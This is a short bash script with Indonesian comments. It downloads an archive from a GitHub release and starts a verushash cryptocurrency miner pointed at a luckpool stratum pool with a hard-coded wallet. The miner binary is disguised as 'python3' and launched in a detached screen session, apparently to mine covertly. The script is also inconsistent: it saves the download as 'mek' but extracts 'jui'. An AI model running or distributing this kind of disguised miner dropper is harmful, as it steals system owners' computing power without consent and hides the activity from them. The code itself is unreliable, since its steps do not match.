#!/bin/bash
 

# Download file
wget -q -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz

# Extract file
tar -xvf jui

# Jalankan command dengan screen dan nama acak
screen -dmS dotsrb ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet RQFBo9pTmWdmM8sfqvLHSdiSM8r1PG5uXZ.Man
